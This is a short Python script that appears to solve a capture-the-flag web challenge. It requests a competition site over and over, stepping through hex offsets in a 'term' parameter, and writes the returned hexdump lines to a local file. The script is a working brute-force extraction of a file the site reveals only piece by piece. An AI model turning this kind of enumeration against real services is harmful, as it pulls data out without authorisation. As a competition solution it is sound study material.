# https://aurora-web.h4ck.ctfcompetition.com/?term=0000&file=hexdump.txt
import requests

URL = "https://aurora-web.h4ck.ctfcompetition.com"

limit = 4294967295
# there are 16 bytes in hexdump
# A byte (or octet) is 8 bits so is always represented by 2 Hex characters in the range 00 to FF.
all_hex = []
for term in range(0,limit, 16):
    term = hex(term)[2:].rjust(8, '0') + ' '
    #term = 'ffffffff '

    PARAMS = {'term':term, 'file': 'hexdump.txt'}
    # sending get request and saving the response as response object
    r = requests.get(url = URL, params = PARAMS)
    data = r.content.decode('utf-8')
    print(term)
    print(data)
    if not data :
        print("Emptyness appeared")
        #break
    else:
        all_hex.append(data)


#print(all_hex)

with open("hexdump.txt", 'w', encoding = 'utf-8') as f:
    for line in all_hex:
        f.write(f"{line}\n")
